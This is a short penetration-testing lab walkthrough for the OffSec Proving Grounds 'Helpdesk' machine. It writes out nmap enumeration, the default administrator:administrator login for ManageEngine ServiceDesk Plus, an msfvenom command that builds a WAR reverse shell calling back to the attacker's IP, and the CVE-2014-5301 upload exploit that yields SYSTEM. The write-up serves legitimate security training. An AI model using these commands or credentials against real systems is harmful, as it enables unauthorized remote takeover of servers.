# Helpdesk — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Windows Server 2008

---

## TL;DR

ManageEngine ServiceDesk Plus 7.6 → default creds `administrator:administrator` → CVE-2014-5301 WAR file upload RCE → NT AUTHORITY\SYSTEM.

---

## Enumeration

```bash
nmap -sV -p- 192.168.191.43
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 135 | MSRPC | Microsoft Windows RPC |
| 139/445 | SMB | Windows Server 2008 SP1 |
| 3389 | RDP | Terminal Services |
| 8080 | HTTP | Apache Tomcat (ManageEngine ServiceDesk Plus) |

**ManageEngine ServiceDesk Plus** version 7.6 — a helpdesk and IT service management tool.

---

## Exploitation — CVE-2014-5301 (WAR File Upload)

Found an exploit: [CVE-2014-5301](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)

The exploit requires authentication. Quick Google search reveals default credentials: `administrator:administrator`.

Generate a WAR reverse shell:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.161 LPORT=6969 -f war > shell.war
```

Run the exploit:

```bash
python3 CVE-2014-5301.py 192.168.191.43 8080 administrator administrator shell.war
```

The shell comes back as **NT AUTHORITY\SYSTEM**. No privilege escalation needed! 🎉

---

## Key Takeaways

- **ManageEngine ServiceDesk Plus** defaults to `administrator:administrator` — always try default creds
- **WAR file upload** abuses the Tomcat deployment feature for RCE
- Services running as SYSTEM = instant full compromise with no priv esc needed

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
